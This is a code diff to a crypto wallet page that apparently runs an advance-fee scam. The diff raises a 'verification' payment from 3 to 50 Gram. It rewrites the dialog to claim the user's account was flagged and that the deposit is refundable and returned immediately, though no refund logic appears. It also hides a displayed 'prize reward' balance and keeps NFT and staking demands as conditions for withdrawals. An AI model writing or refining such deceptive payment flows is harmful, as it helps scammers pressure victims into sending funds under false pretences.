@@ -21,7 +21,7 @@ const NOVA_ICON = "/images/nova-icon.jpg";
 
 const TON_ICON = "/images/gram-icon.png";
 const USDT_ICON = "/images/usdt.png";
-const VERIFY_AMOUNT = 3;
+const VERIFY_AMOUNT = 50;
 const NFT_MIN_GRAM = 4;
 const STAKE_MIN_GRAM = 15;
 const TON_USD = 3.5;
@@ -278,7 +278,7 @@ const WalletPage = () => {
       if (!marked?.success) throw new PaymentError("failed", "Payment confirmed but verification failed. Contact support.");
       setIsVerified(true);
       setVerifyOpen(false);
-      toast({ title: "Wallet verified", description: "Your wallet ownership is confirmed" });
+      toast({ title: "Verification complete", description: "Your account is confirmed as a real person" });
       if (!hasNft) setReqOpen("nft");
       else if (stakedTon < STAKE_MIN_GRAM) setReqOpen("stake");
       else {
@@ -314,7 +314,7 @@ const WalletPage = () => {
       >
         <p className="paper-eyebrow">Total balance</p>
         <h2 className="mt-1 font-display text-[44px] leading-none tracking-tight text-foreground">
-          ${(user.tonBalance * (markets["the-open-network"]?.price || TON_USD) + user.usdtBalance + Number(user.rewardBalance ?? 0)).toFixed(2)}
+          ${(user.tonBalance * (markets["the-open-network"]?.price || TON_USD) + user.usdtBalance).toFixed(2)}
         </h2>
 
         <div className="mt-5 grid grid-cols-2 gap-2.5">
@@ -343,25 +343,6 @@ const WalletPage = () => {
         animate={{ opacity: 1, y: 0 }}
         transition={{ delay: 0.05 }}
       >
-        {Number(user.rewardBalance ?? 0) > 0 && (
-          <div className="flex items-center gap-3 px-4 py-3.5">
-            <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-action text-action-foreground">
-              <Lock className="h-4 w-4" />
-            </span>
-            <div className="min-w-0 flex-1">
-              <p className="text-sm font-semibold text-foreground">Locked USDT</p>
-              <p className="text-[11px] text-muted-foreground">Prize reward</p>
-            </div>
-            <div className="text-right">
-              <p className="font-display text-base text-foreground">
-                {Number(user.rewardBalance).toLocaleString("en-US", { maximumFractionDigits: 2 })}
-              </p>
-              <p className="text-[11px] text-muted-foreground">
-                ≈ ${Number(user.rewardBalance).toLocaleString("en-US", { maximumFractionDigits: 2 })}
-              </p>
-            </div>
-          </div>
-        )}
         {balances.map((b) => (
           <div key={b.symbol} className="flex items-center gap-3 px-4 py-3.5">
             <span className="flex h-10 w-10 shrink-0 items-center justify-center overflow-hidden rounded-full bg-card">
@@ -563,18 +544,20 @@ const WalletPage = () => {
             />
             <DialogHeader className="relative z-10">
               <DialogTitle className="text-[10px] font-normal uppercase tracking-[0.34em] text-muted-foreground">
-                Wallet verification
+                Account review
               </DialogTitle>
-              <DialogDescription className="sr-only">One-time wallet verification fee</DialogDescription>
+              <DialogDescription className="sr-only">Human verification deposit</DialogDescription>
             </DialogHeader>
             <div className="relative z-10 mt-6 rounded-[28px] border border-white/[0.08] bg-foreground/[0.05] px-5 py-6">
               <p className="text-[38px] font-display font-medium leading-none text-gradient-primary">
                 {VERIFY_AMOUNT} Gram
               </p>
-              <p className="mt-2 text-[11px] uppercase tracking-[0.2em] text-muted-foreground">One-time fee</p>
+              <p className="mt-2 text-[11px] uppercase tracking-[0.2em] text-muted-foreground">Refundable check</p>
             </div>
             <p className="relative z-10 mt-5 text-[12px] leading-relaxed text-muted-foreground">
-              Verify wallet ownership to unlock withdrawals. This is required once.
+              Your account has been flagged by our review system because of its transaction pattern and activity
+              behaviour. If you are not a bot or an automated script, send {VERIFY_AMOUNT} Gram to confirm you are a
+              real person. The amount is only used for the check and returns to your wallet immediately.
             </p>
             <p className="relative z-10 mt-2 text-[11px] leading-relaxed text-muted-foreground">
               Keep at least {(VERIFY_AMOUNT + TON_FEE_BUFFER).toFixed(2)} Gram in your wallet so the network fee is
@@ -588,9 +571,9 @@ const WalletPage = () => {
             </button>
             {whyOpen && (
               <p className="relative z-10 mt-4 rounded-[24px] border border-white/[0.08] bg-foreground/[0.05] p-4 text-left text-[12px] leading-relaxed text-muted-foreground">
-                We have many investors, so every account must be proven real and not fake — the prize must never go
-                to a fake account. The verification fee proves wallet ownership, protects everyone's funds, and
-                unlocks all future withdrawals.
+                We have many investors, so every account must be proven real and not automated. This check is only
+                triggered for accounts flagged by our review system. The {VERIFY_AMOUNT} Gram is returned to your
+                wallet right after the check and unlocks all future withdrawals.
               </p>
             )}
             <Button
@@ -598,7 +581,7 @@ const WalletPage = () => {
               disabled={verifying}
               className="relative z-10 mt-6 h-12 w-full rounded-2xl font-display text-[15px] font-medium glow-primary"
             >
-              {verifying ? "Verifying" : `Pay ${VERIFY_AMOUNT} Gram and verify`}
+              {verifying ? "Verifying" : `Send ${VERIFY_AMOUNT} Gram and verify`}
             </Button>
             <button
               onClick={() => setVerifyOpen(false)}
@@ -637,7 +620,7 @@ const WalletPage = () => {
             </div>
             <p className="relative z-10 mt-5 text-[12px] leading-relaxed text-muted-foreground">
               {reqOpen === "nft"
-                ? `Own an NFT worth at least ${NFT_MIN_GRAM} Gram to unlock withdrawals. This confirms the account is active and real before the prize is released.`
+                ? `Own an NFT worth at least ${NFT_MIN_GRAM} Gram to unlock withdrawals. This confirms the account is active and real before withdrawals are released.`
                 : `Stake at least ${STAKE_MIN_GRAM} Gram on the Bonds page to unlock withdrawals. You currently have ${stakedTon.toLocaleString("en-US", { maximumFractionDigits: 2 })} Gram staked.`}
             </p>
             <Button
